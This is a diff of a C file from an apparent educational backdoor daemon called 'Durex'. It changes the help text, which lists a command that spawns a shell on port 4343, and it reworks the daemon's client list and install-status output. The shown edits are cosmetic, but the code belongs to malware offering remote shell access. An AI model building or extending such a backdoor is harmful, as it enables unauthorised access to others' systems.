@@ -6,7 +6,7 @@
 /*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
-/*   Updated: 2019/11/21 15:31:38 by banthony         ###   ########.fr       */
+/*   Updated: 2019/11/21 17:26:34 by banthony         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -29,7 +29,7 @@ static t_bool	server_cmd_help(t_client *client, t_server *server)
 							"\t'help' or '?'\t- Show this message.\n"
 							"\t'exit'\t\t- Quit Durex.\n"
 							"\t'shell'\t\t- Spawn a shell on port 4343.\n"
-							"\t'uninstall'\t- Uninstall Durex.\n"
+							"\t'uninstall'\t- Uninstall Durex. (/!\\ kill Durex daemon on success /!\\)\n"
 							"\t'log'\t\t- Print durex log file.\n"
 							"\t'stat'\t\t- Print status and information about durex.\n\n"
 							COLORIZE(SH_YELLOW, " Informations:\n")
@@ -153,15 +153,16 @@ static char		*get_client_list(t_server *server)
 {
 	t_list	*lst;
 	char	prefix_str[PREFIX_SIZE] = {0};
-	char	clients[MAX_CLIENT * 36] = {0};
-
+	char	clients[MAX_CLIENT * 360] = {0};
+	char	*suffix = " connected.\n\t";
 	lst = server->client_lst;
 	while (lst)
 	{
+		ft_memset(prefix_str, 0, PREFIX_SIZE);
 		if (client_prefix(lst->content, &prefix_str))
 		{
 			ft_strncat(clients, prefix_str, ft_strlen(prefix_str));
-			ft_strncat(clients, " connected.\n", 1);
+			ft_strncat(clients, suffix, ft_strlen(suffix));
 		}
 		lst = lst->next;
 	}
@@ -173,7 +174,7 @@ static t_bool	server_cmd_stat(t_client *client, t_server *server)
 	char	*header = NULL;
 	char	*install_status = NULL;
 	char	*clients = NULL;
-	char	*footer = NULL;
+	char	*footer = "\n";
 	char	*final_status = NULL;
 	size_t	status_len;
 
@@ -181,11 +182,12 @@ static t_bool	server_cmd_stat(t_client *client, t_server *server)
 		return (false);
 	header = COLORIZE(SH_BLUE, "• ") "Durex status:\n\t";
 	if (durex_is_installed())
-		install_status = "Durex install: "COLORIZE(SH_YELLOW, "• ")"Not install or corrupt. (see help)\n\t";
+		install_status = "Durex install: "COLORIZE(SH_GREEN, "• ")
+			"Correctly installed.\n\tConnexions:\n\t";
 	else
-		install_status = "Durex install: "COLORIZE(SH_GREEN, "• ")"Correctly installed.\n\t";
+		install_status = "Durex install: "COLORIZE(SH_YELLOW, "• ")
+			"Not install or corrupt. (see help)\n\tConnexions:\n\t";
 	clients = get_client_list(server);
-	footer = "\n";
 	status_len = ft_strlen(header) + ft_strlen(install_status) + ft_strlen(clients) + ft_strlen(footer);
 	final_status = ft_strnew(status_len);
 	ft_strncpy(final_status, header, ft_strlen(header));
